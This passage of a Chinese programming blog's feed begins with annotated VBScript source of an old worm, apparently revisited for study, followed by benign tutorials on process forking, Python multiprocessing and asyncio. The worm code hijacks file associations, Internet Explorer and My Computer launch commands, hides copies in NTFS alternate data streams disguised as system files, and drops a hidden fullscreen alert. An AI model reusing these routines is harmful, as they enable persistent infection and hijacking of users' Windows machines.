class="line">'//改变cmd格式文件关联</span><br><span class="line">Sub SetCmdFileAss(sFilePath)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim Value</span><br><span class="line">    Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" %1 %* "</span><br><span class="line">    Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/cmdfile/shell/open/command/", Value, "REG_EXPAND_SZ")</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//改变hlp格式文件关联</span><br><span class="line">Sub SethlpFileAss(sFilePath)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim Value</span><br><span class="line">    Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" %1 %* "</span><br><span class="line">    Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/hlpfile/shell/open/command/", Value, "REG_EXPAND_SZ")</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//改变reg格式文件关联</span><br><span class="line">Sub SetRegFileAss(sFilePath)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim Value</span><br><span class="line">    Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" %1 %* "</span><br><span class="line">    Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/regfile/shell/open/command/", Value, "REG_EXPAND_SZ")</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//改变chm格式文件关联</span><br><span class="line">Sub SetchmFileAss(sFilePath)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim Value</span><br><span class="line">    Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" %1 %* "</span><br><span class="line">    Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/chm.file/shell/open/command/", Value, "REG_EXPAND_SZ")</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//篡改IE启动设置</span><br><span class="line">Sub SetIEAss(sFilePath)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim Value</span><br><span class="line">    Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" OIE "</span><br><span class="line">    Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/Applications/iexplore.exe/shell/open/command/", Value, "REG_EXPAND_SZ")</span><br><span class="line">    Call WriteReg("HKEY_CLASSES_ROOT/CLSID/{871C5380-42A0-1069-A2EA-08002B30309D}/shell/OpenHomePage/Command/", Value, "REG_EXPAND_SZ")</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//改变我的电脑的打开关联，包括Win+E</span><br><span class="line">Sub SetMyComputerAss(sFilePath)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim Value1,Value2</span><br><span class="line">    Value1="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" OMC "</span><br><span class="line">    Value2="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" EMC "</span><br><span class="line">    Call WriteReg("HKEY_CLASSES_ROOT/CLSID/{20D04FE0-3AEA-1069-A2D8-08002B30309D}/shell/", "", "REG_SZ")</span><br><span class="line">    Call WriteReg("HKEY_CLASSES_ROOT/CLSID/{20D04FE0-3AEA-1069-A2D8-08002B30309D}/shell/open/command/", Value1, "REG_EXPAND_SZ")</span><br><span class="line">    Call WriteReg("HKEY_CLASSES_ROOT/CLSID/{20D04FE0-3AEA-1069-A2D8-08002B30309D}/shell/explore/command/", Value2, "REG_EXPAND_SZ")</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//获得系统驱动盘符名 Drive.SerialNumber 盘符序列号 c-->驱动器 C: - 固定<span class="tag"><<span class="name">BR</span>></span>序列号：-1598325125、d-->驱动器 D: - 固定<span class="tag"><<span class="name">BR</span>></span>序列号：237835280、e、f。</span><br><span class="line">Function GetSerialNumber(Drv)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Set d=fso.GetDrive(Drv)</span><br><span class="line">    GetSerialNumber=d.SerialNumber '// 返回十进制序列号，用于唯一标识一个磁盘卷。Select Case d.DriveType     Case 0: t = "未知"    Case 1: t = "可移动"    Case 2: t = "固定"</span><br><span class="line">                           '// Case 3: t = "网络"    Case 4: t = "CD-ROM"    Case 5: t = "RAM 磁盘"      End Select</span><br><span class="line">    GetSerialNumber=Replace(GetSerialNumber,"-","")</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">'//获得蠕虫病毒路径   &表示字符串相加  GetSpecialFolder 返回指定的特殊文件夹</span><br><span class="line">Function GetMainVirus(N)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    MainVirusName=GetSerialNumber(GetSystemDrive())&".vbs"</span><br><span class="line">    If GetFileSystemType(GetSystemDrive())="NTFS" Then</span><br><span class="line">        If N=1 Then '//System 文件夹，包含库、字体和设备驱动程序文件。 SystemFolder</span><br><span class="line">              GetMainVirus=Fso.GetSpecialFolder(N)&"/smss.exe:"&MainVirusName '//返回 如c:/windows/system32/smss.exe:72161642.vbs</span><br><span class="line">        End If</span><br><span class="line">        If N=0 Then '//Windows 文件夹，包含 Windows 操作系统安装的文件。 WindowsFolder</span><br><span class="line">              GetMainVirus=Fso.GetSpecialFolder(N)&"/explorer.exe:"&MainVirusName '//返回 如c:/windows/explorer.exe:72161642.vbs</span><br><span class="line">        End If</span><br><span class="line">    Else</span><br><span class="line">          GetMainVirus=Fso.GetSpecialFolder(N)&"/"&MainVirusName</span><br><span class="line">    End If</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">'//返回指定路径vbs脚本的运行个数</span><br><span class="line">Function VBSProcessCount(VBSPath)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim WMIService, ProcessList, Process</span><br><span class="line">    VBSProcessCount=0</span><br><span class="line">    Set WMIService=GetObject("winmgmts://./root/cimv2")</span><br><span class="line">    Set ProcessList=WMIService.ExecQuery("Select * from Win32_Process Where "&"Name='cscript.exe' or Name='wscript.exe' or Name='svchost.exe'")</span><br><span class="line">    For Each Process in ProcessList</span><br><span class="line">        If InStr(Process.CommandLine, VBSPath)>0 Then</span><br><span class="line">            VBSProcessCount=VBSProcessCount+1</span><br><span class="line">        End If</span><br><span class="line">    Next</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">'//'用来计数wscript进程的个数，如果大于等于3个那么返回True</span><br><span class="line">Function PreDblInstance()</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    PreDblInstance=False</span><br><span class="line">    If VBSProcessCount(WScript.ScriptFullName)>= 3 Then</span><br><span class="line">        PreDblInstance=True</span><br><span class="line">    End If</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">'//获取快捷方式的vbs脚本地址</span><br><span class="line">Function GetTargetPath(LnkPath)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim Shortcut</span><br><span class="line">    Set Shortcut=WshShell.CreateShortcut(LnkPath)</span><br><span class="line">    GetTargetPath=Shortcut.TargetPath</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">'//读取文件 返回 TextStream</span><br><span class="line">Function GetCode(FullPath)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim FileText</span><br><span class="line">    Set FileText=FSO.OpenTextFile(FullPath, 1) '//打开指定的文件并返回一个 TextStream 对象，可以读取、写入此对象或将其追加到文件。 </span><br><span class="line">                           '// 1 以只读模式打开文件。不能对此文件进行写操作。</span><br><span class="line">    GetCode=FileText.ReadAll '//读入全部 TextStream 文件并返回结果字符串</span><br><span class="line">    FileText.Close</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">'//获得注册表 版本键值 获取windows版本</span><br><span class="line">Function GetVersion()</span><br><span class="line">    Dim VerInfo</span><br><span class="line">    VerInfo="HKEY_CURRENT_USER/SoftWare/Microsoft/Windows NT/CurrentVersion/Windows/Ver"</span><br><span class="line">    If ReadReg(VerInfo)="" Then</span><br><span class="line">        GetVersion=0</span><br><span class="line">    Else</span><br><span class="line">        GetVersion=CInt(ReadReg(VerInfo)) '//CInt 返回表达式，此表达式已被转换为 Integer 子类型的 Variant。</span><br><span class="line">    End If</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">'//网页文件BFAlert.hta</span><br><span class="line">Sub VirusAlert()</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim HtaPath,HtaCode</span><br><span class="line">    HtaPath=Fso.GetSpecialFolder(1)&"/BFAlert.hta"</span><br><span class="line">    HtaCode="<span class="tag"><<span class="name">HTML</span>></span><span class="tag"><<span class="name">HEAD</span>></span><span class="tag"><<span class="name">TITLE</span>></span>暴风一号<span class="tag"></<span class="name">TITLE</span>></span>"&VBCRLF&"<span class="tag"><<span class="name">HTA:APPLICATION</span> <span class="attr">APPLICATIONNAME</span>=<span class="string">""</span><span class="attr">BoyFine</span> <span class="attr">V1.0</span>"" <span class="attr">SCROLL</span>=<span class="string">""</span><span class="attr">no</span>"" <span class="attr">windowstate</span>=<span class="string">""</span><span class="attr">maximize</span>""</span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag"><span class="attr">border</span>=<span class="string">""</span><span class="attr">none</span>"""&<span class="attr">VBCRLF</span>&"<span class="attr">SINGLEINSTANCE</span>=<span class="string">""</span><span class="attr">yes</span>"" <span class="attr">CAPTION</span>=<span class="string">""</span><span class="attr">no</span>"" <span class="attr">contextMenu</span>=<span class="string">""</span><span class="attr">no</span>"" <span class="attr">ShowInTaskBar</span>=<span class="string">""</span><span class="attr">no</span>"" <span class="attr">selection</span>=<span class="string">""</span><span class="attr">no</span>""></span>"&VBCRLF&"<span class="tag"></<span class="name">HEAD</span>></span><span class="tag"><<span class="name">BODY</span> <span class="attr">bgcolor</span>=<span class="string">#000000</span>></span><span class="tag"><<span class="name">DIV</span> <span class="attr">align</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">=<span class="string">""</span><span class="attr">center</span>""></span>"&VBCRLF&"<span class="tag"><<span class="name">font</span> <span class="attr">style</span>=<span class="string">""</span><span class="attr">font-size:3500</span>%;<span class="attr">font-family:Wingdings</span>;<span class="attr">color</span>=<span class="string">red</span>""></span>N<span class="tag"></<span class="name">font</span>></span><span class="tag"><<span class="name">BR</span>></span>"&VBCRLF&"<span class="tag"><<span class="name">font</span> <span class="attr">style</span>=<span class="string">""</span><span class="attr">font-size:200</span>%;<span class="attr">font-family:</span>黑体;<span class="attr">color</span>=<span class="string">red</span>""></span>暴风一号</span><br><span class="line"></span><br><span class="line"><span class="tag"></<span class="name">font</span>></span>"&VBCRLF&"<span class="tag"></<span class="name">DIV</span>></span><span class="tag"></<span class="name">BODY</span>></span><span class="tag"></<span class="name">HTML</span>></span>"</span><br><span class="line">    If FSO.FileExists(HtaPath)=False Then</span><br><span class="line">        Call CreateFile(HtaCode, HtaPath) '//创建网页文件BFAlert.hta</span><br><span class="line">        Call SetHiddenAttr(HtaPath) '//设置隐藏</span><br><span class="line">    End If</span><br><span class="line">    Call Run(HtaPath)</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//获得感染注册表时间键</span><br><span class="line">Function GetInfectedDate()</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim DateInfo</span><br><span class="line">    DateInfo="HKEY_CURRENT_USER/SoftWare/Microsoft/Windows NT/CurrentVersion/Windows/Date"</span><br><span class="line">    If ReadReg(DateInfo)="" Then</span><br><span class="line">        GetInfectedDate=""</span><br><span class="line">    Else</span><br><span class="line">        GetInfectedDate=CDate(ReadReg(DateInfo))</span><br><span class="line">    End If</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">'//弹出光驱</span><br><span class="line">Sub MakeJoke(Times)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim WMP, colCDROMs</span><br><span class="line">    Set WMP = CreateObject( "WMPlayer.OCX" ) '//创建WMPlayer.OCX插件对象</span><br><span class="line">    Set colCDROMs = WMP.cdromCollection '//系统中光驱</span><br><span class="line">    If colCDROMs.Count >0 Then</span><br><span class="line">        For i=1 to Times</span><br><span class="line">            colCDROMs.Item(0).eject() '//退出抽取式设备</span><br><span class="line">            WScript.Sleep 3000</span><br><span class="line">            colCDROMs.Item(0).eject()</span><br><span class="line">        Next</span><br><span class="line">    End If</span><br><span class="line">    Set WMP = Nothing</span><br><span class="line">End Sub</span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;HTA是Html Application的简写，也就是“基于html技术编写的应用程序”。它是Microsot在很久以前推出一门技术。作为一门技术，它已经很老了（和如今日新月异的前端技术比起来）。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="旧物新篇" scheme="https://celestialcode.xyz/categories/%E6%97%A7%E7%89%A9%E6%96%B0%E7%AF%87/"/>
    
    
      <category term="HTA病毒" scheme="https://celestialcode.xyz/tags/HTA%E7%97%85%E6%AF%92/"/>
    
  </entry>
  
  <entry>
    <title>多进程编程</title>
    <link href="https://celestialcode.xyz/%E5%A4%9A%E8%BF%9B%E7%A8%8B%E7%BC%96%E7%A8%8B.html"/>
    <id>https://celestialcode.xyz/多进程编程.html</id>
    <published>2019-04-15T08:44:43.000Z</published>
    <updated>2019-05-08T18:36:16.173Z</updated>
    
    <content type="html"><![CDATA[<p>由于GIL的存在，cpython在处理CPU密集型操作时无法使出真正的多线程，这时候就要用到多进程。多进程通常针对多核CPU，单核CPU要借助调度算法也可以达到几乎同样的效果。<br>一个程序就是一个进程，多进程指的是<strong>多个程序同时进行</strong>。进程是资源分配的最小单位。<br><a id="more"></a></p><h1 id="fork调用"><a href="#fork调用" class="headerlink" title="fork调用"></a>fork调用</h1><p>Unix/Linux提供fork()系统调用，用来创建新的进程。<br>它不接受任何参数，返回创建进程的Process ID；调用fork的进程被称为父进程（parent process），由fork调用创建出的新进程叫该父进程的子进程（child Process）。</p><ul><li>如果fork()返回负数，子进程创建失败</li><li>如果子进程创建成功，fork()的返回值<ul><li>在子进程中返回0</li><li>在父进程中返回新创建子进程的进程id（为正数），返回的进程ID是sys/types.h中定义的pid_t类型。通常进程ID是整数。 此外进程可以使用函数getpid()来检索分配给此进程的进程ID.</li></ul></li></ul><p>下面是一个例子，<a href="/uploads/fork-01.c">点我下载</a><br></p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span>  <span class="meta-string"><stdio.h></span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span>  <span class="meta-string"><string.h></span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span>  <span class="meta-string"><sys/types.h></span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>   MAX_COUNT  200</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>   BUF_SIZE   100</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>  <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">     <span class="keyword">pid_t</span>  pid;</span><br><span class="line">     <span class="keyword">int</span>    i;</span><br><span class="line">     <span class="keyword">char</span>   buf[BUF_SIZE];</span><br><span class="line"></span><br><span class="line">     fork();</span><br><span class="line">     pid = getpid();</span><br><span class="line">     <span class="keyword">for</span> (i = <span class="number">1</span>; i <= MAX_COUNT; i++) {</span><br><span class="line">          <span class="built_in">sprintf</span>(buf, <span class="string">"This line is from pid %d, value = %d\n"</span>, pid, i);</span><br><span class="line">          write(<span class="number">1</span>, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">     } </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>fork函数运行一次，返回两次。</strong><br><strong>其实哪里是返回两次，不过是在父进程和子进程中分别返回一次罢了。</strong></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string"><stdio.h></span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string"><unistd.h></span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">pid_t</span> fpid;</span><br><span class="line">    fpid = fork();</span><br><span class="line">    <span class="keyword">if</span>(fpid < <span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">"error in fork\n"</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(fpid == <span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">"I am the child process, pid = %d\n"</span>, getpid());</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">"I am the parent process, pid = %d\n"</span>, getpid());</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"In this process, fork() returns %d\n"</span>, fpid);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>结果如下</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">z@ubuntu:~$ ./a.out </span><br><span class="line">I am the parent process, pid = <span class="number">31129</span>#父进程</span><br><span class="line">In <span class="keyword">this</span> process, fork() returns <span class="number">31130</span>#父进程</span><br><span class="line">I am the child process, pid = <span class="number">31130</span>#子进程</span><br><span class="line">In <span class="keyword">this</span> process, fork() returns <span class="number">0</span>#子进程</span><br></pre></td></tr></tbody></table></figure><h1 id="multiprocessing库（python）"><a href="#multiprocessing库（python）" class="headerlink" title="multiprocessing库（python）"></a>multiprocessing库（python）</h1><p>如果是Unix/Linux用户，使用<code>os.fork()</code>或者<code>os.system('fork()')</code>实现多进程。<br>考虑Windwos用户的感受，咱们主要靠multiprocessing库实现多进程。</p><p>multiprocessing库借鉴了threading的API，在函数调用上几乎无二致。使用multiprocessing实现真正的并发或者并行（规避了python全局锁问题）。</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_job</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    模拟CPU密集型操作</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    print(<span class="string">'Process %d runs'</span> %os.getpid())</span><br><span class="line">    a = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">999</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">999</span>):</span><br><span class="line">            a += <span class="number">1</span></span><br><span class="line">            a -= <span class="number">1</span></span><br><span class="line">    print(<span class="string">'Process %d ends'</span> %os.getpid())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    主函数，创建多进程并调用</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    p1 = multiprocessing.Process(target=process_job)</span><br><span class="line">    p2 = multiprocessing.Process(target=process_job)</span><br><span class="line">    p1.start()</span><br><span class="line">    p1.join()  <span class="comment">#join使得子进程结束后再继续执行其父进程</span></span><br><span class="line">    p2.start()</span><br><span class="line">    p2.join()</span><br><span class="line">    print(<span class="string">'All is done'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure><p>结果如下</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">z@ubuntu:~$ python pp.py </span><br><span class="line">Process <span class="number">24797</span> runs</span><br><span class="line">Process <span class="number">24797</span> ends</span><br><span class="line">Process <span class="number">24798</span> runs</span><br><span class="line">Process <span class="number">24798</span> ends</span><br><span class="line">All <span class="keyword">is</span> done</span><br></pre></td></tr></tbody></table></figure><p>进程的开销较大，因此不能无节制的开启新进程。可以通过维护一个<strong>进程池</strong>来控制进程的数量<br>进程池的大小指的是<strong>实际上最多可处于活跃状态进程的数量</strong>（动态平衡）默认下等于CPU个数，即每个CPU对应一个正在执行的进程。<code>pool=Pool(x) (x≥1)</code></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">writefile</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'123.txt'</span>, <span class="string">'a+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.writelines(str(x))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sayHi</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    e1 = time.time()</span><br><span class="line">    pool = multiprocessing.Pool(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        pool.apply_async(func=sayHi, args=(i, ), callback=writefile)</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line">    e2 = time.time()</span><br><span class="line">    print(float(e2-e1))</span><br></pre></td></tr></tbody></table></figure><p>运行结果</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">z@ubuntu:~$ python pp.py </span><br><span class="line"><span class="number">0.11623597145080566</span></span><br><span class="line">z@ubuntu:~$ file <span class="number">123.</span>txt </span><br><span class="line"><span class="number">123.</span>txt: ASCII text, <span class="keyword">with</span> no line terminators</span><br></pre></td></tr></tbody></table></figure><p>python多进程，还是弥补其编译器GIL的缺陷，对于<strong>CPU密集型操作首选多进程，对于IO密集型操作考虑多进程或协程。</strong>或者直接更换编译器，如pypy。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;由于GIL的存在，cpython在处理CPU密集型操作时无法使出真正的多线程，这时候就要用到多进程。多进程通常针对多核CPU，单核CPU要借助调度算法也可以达到几乎同样的效果。&lt;br&gt;一个程序就是一个进程，多进程指的是&lt;strong&gt;多个程序同时进行&lt;/strong&gt;。进程是资源分配的最小单位。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="并发编程" scheme="https://celestialcode.xyz/categories/%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="python" scheme="https://celestialcode.xyz/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>协程（二）</title>
    <link href="https://celestialcode.xyz/%E5%8D%8F%E7%A8%8B%EF%BC%88%E4%BA%8C%EF%BC%89.html"/>
    <id>https://celestialcode.xyz/协程（二）.html</id>
    <published>2019-04-03T19:53:17.000Z</published>
    <updated>2019-05-08T18:36:16.173Z</updated>
    
    <content type="html"><![CDATA[<p>Python从3.4版本开始，引入asyncio标准库；从3.5版本开始，引入async/await语法声明。<br>对于py3，将一个函数升级为协程（或者说“协程函数”）通常有以下两种办法：</p><ul><li>asyncio.coroutine装饰器+yield from本地调用</li><li>async关键字+await本地调用（推荐）<a id="more"></a></li></ul><p>注意，<strong>和普通函数不同，协程函数不能直接调用，必须借助事件循环（event loop）</strong></p><figure class="highlight oxygene"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">In</span> [<span class="number">1</span>]: import asyncio                                                          </span><br><span class="line"></span><br><span class="line"><span class="keyword">In</span> [<span class="number">2</span>]: <span class="keyword">async</span> def a(): </span><br><span class="line">   ...:     print(<span class="string">'Hello async, I am coroutine A!'</span>) </span><br><span class="line">   ...:     return <span class="string">'**DONE**'</span> </span><br><span class="line">   ...:                                                                         </span><br><span class="line"></span><br><span class="line"><span class="keyword">In</span> [<span class="number">3</span>]: @asyncio.coroutine </span><br><span class="line">   ...: def b(): </span><br><span class="line">   ...:     print(<span class="string">'Hello async, I am coroutine B!'</span>) </span><br><span class="line">   ...:     return <span class="string">'**DONE**'</span> </span><br><span class="line">   ...:                                                                         </span><br><span class="line"></span><br><span class="line"><span class="keyword">In</span> [<span class="number">4</span>]: a()                                                                     </span><br><span class="line"><span class="keyword">Out</span>[<span class="number">4</span>]: <coroutine object a at <span class="number">0</span>x7f96713e30c8></span><br><span class="line"></span><br><span class="line"><span class="keyword">In</span> [<span class="number">5</span>]: b()                                                                     </span><br><span class="line"><span class="keyword">Out</span>[<span class="number">5</span>]: <generator object b at <span class="number">0</span>x7f96605c8cf0></span><br><span class="line"></span><br><span class="line"><span class="keyword">In</span> [<span class="number">6</span>]: asyncio.run(a())                                                        </span><br><span class="line">Hello <span class="keyword">async</span>, I am coroutine A!</span><br><span class="line"><span class="keyword">Out</span>[<span class="number">6</span>]: <span class="string">'**DONE**'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">In</span> [<span class="number">7</span>]: asyncio.run(b())                                                        </span><br><span class="line">Hello <span class="keyword">async</span>, I am coroutine B!</span><br><span class="line"><span class="keyword">Out</span>[<span class="number">7</span>]: <span class="string">'**DONE**'</span></span><br></pre></td></tr></tbody></table></figure><p>事件循环是每个asyncio应用的核心，asyncio也不过是一个事件循环框架罢了。事件循环会运行异步任务和回调，执行网络IO操作，以及运行子程序。应用开发者通常应当使用高层级的asyncio函数，例如asyncio.run()，应当很少有必要引用循环对象或调用其方法。</p><p>什么是事件循环？根据维基百科，事件循环“是在程序中等待并调遣时间或消息的编程结构”。</p><p><img src="/uploads/eventloop.jpg" alt></p><p>事件循环提供了这样一种机制，“when A happens then do B”。基本上，事件循环会监视什么时候发生了什么，当事件循环关心的事情发生时，它会调用任何关心发生了什么的代码。</p><p>下面这个例子，它满足</p><ul><li>一个线程</li><li>并发执行</li></ul><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 